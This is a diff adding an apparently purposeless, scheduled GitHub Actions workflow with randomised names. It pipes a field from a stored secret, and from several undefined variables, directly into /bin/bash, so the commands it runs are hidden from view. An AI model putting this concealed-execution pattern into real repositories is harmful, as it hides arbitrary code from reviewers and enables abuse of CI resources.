@@ -1,0 +1,23 @@
+name: langminghongcai
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '5 1/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: langminghongcai
+        env:
+          t4565: ${{ secrets.t4565 }}
+        run: |
+          echo $t4565 | jq -r .hrk16064 | /bin/bash
+          echo $cmqnz179 | jq -r .whsp20158 | /bin/bash
+          echo $a8 | jq -r .nagxx5 | /bin/bash
+          echo $zpt4011 | jq -r .dsre453 | /bin/bash
+          echo $snqqz9485 | jq -r .jqamu81 | /bin/bash
+          echo $krli51 | jq -r .y35 | /bin/bash
+
